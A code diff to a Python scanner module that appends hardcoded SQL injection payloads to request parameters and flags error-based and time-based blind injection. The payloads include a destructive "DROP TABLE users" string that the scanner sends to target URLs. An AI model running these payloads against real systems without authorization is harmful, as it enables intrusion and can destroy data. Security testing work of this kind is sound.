@@ -1,4 +1,5 @@
 import requests
+import time
 import re
 
 class Module:
@@ -6,7 +7,6 @@ class Module:
         injection_vectors = context.get('injection_vectors', [])
         module_results = []
 
-        # Chargement des signatures d'erreur
         error_signatures = [
             'you have an error in your sql syntax',
             'warning: mysql',
@@ -18,67 +18,63 @@ class Module:
             'Warning: mysql'
         ]
 
-        # Regroupement des payloads par URL
-        url_payloads = {}
+        sql_payloads = [
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "' OR sleep(5)#"
+        ]
+
         for vector in injection_vectors:
-            url = vector['url']
-            url_payloads.setdefault(url, []).append(vector)
-
-        vulnerable_urls = set()
-
-        for url, vectors in url_payloads.items():
-            if url in vulnerable_urls:
-                continue  # URL déjà vulnérable
-
-            for vector in vectors:
-                method = vector.get('method', 'get')
-                params = vector.get('params')
-                data = vector.get('data')
-                payload = params or data 
-
-                print(f"Testing {method.upper()} {url} with payload {payload}")
-
+            url = vector.get('url')
+            method = vector.get('method', 'get')
+            params = vector.get('params')
+            data = vector.get('data')
+            for payload in sql_payloads:
+                test_params = {key: f"{value}{payload}" for key, value in (params or {}).items()}
+                test_data = {key: f"{value}{payload}" for key, value in (data or {}).items()}
                 try:
-                    # Envoi de la requête avec le payload
+                    start_time = time.time()
                     if method == 'get':
-                        response = requests.get(url, params=params, timeout=10)
+                        response = requests.get(url, params=test_params, timeout=10)
                     elif method == 'post':
-                        response = requests.post(url, data=data, timeout=10)
+                        response = requests.post(url, data=test_data, timeout=10)
                     else:
-                        continue 
+                        continue
 
-                    # Analyse de la réponse pour détecter des signatures d'erreur
+                    end_time = time.time()
+                    response_time = end_time - start_time
                     for signature in error_signatures:
                         if re.search(signature, response.text, re.IGNORECASE):
-                            # Vulnérabilité potentielle détectée
-                            result = {
-                                'type': 'query_parameter' if method.lower() == 'get' else 'form',
+                            module_results.append({
                                 'url': url,
                                 'method': method.upper(),
                                 'payload': payload,
-                                'error_signature': signature
-                            }
-                            module_results.append(result)
-                            vulnerable_urls.add(url)
-                            break  # On arrête après la première signature correspondante
-
-                    # Si une vulnérabilité a été trouvée, on n'a pas besoin de tester plus de payloads
-                    if url in vulnerable_urls:
-                        break
-
+                                'error_signature': signature,
+                                'vulnerable': True,
+                                'type': 'Error-Based SQL Injection'
+                            })
+                            break
+                    if 'sleep' in payload and response_time > 5:
+                        module_results.append({
+                            'url': url,
+                            'method': method.upper(),
+                            'payload': payload,
+                            'response_time': response_time,
+                            'vulnerable': True,
+                            'type': 'Time-Based Blind SQL Injection'
+                        })
                 except requests.RequestException as e:
-                    continue
+                    module_results.append({
+                        'url': url,
+                        'error': str(e),
+                        'vulnerable': False
+                    })
 
-        if len(module_results) >= 1:
-            module_results.append({
-                'vulnerable': True
-            })
-        else:
+        if not module_results:
             module_results.append({
                 'message': 'No SQL injection vulnerabilities detected',
                 'vulnerable': False
             })
 
-        # Stocker les résultats dans le contexte
         context['module_results'] = module_results
         return context
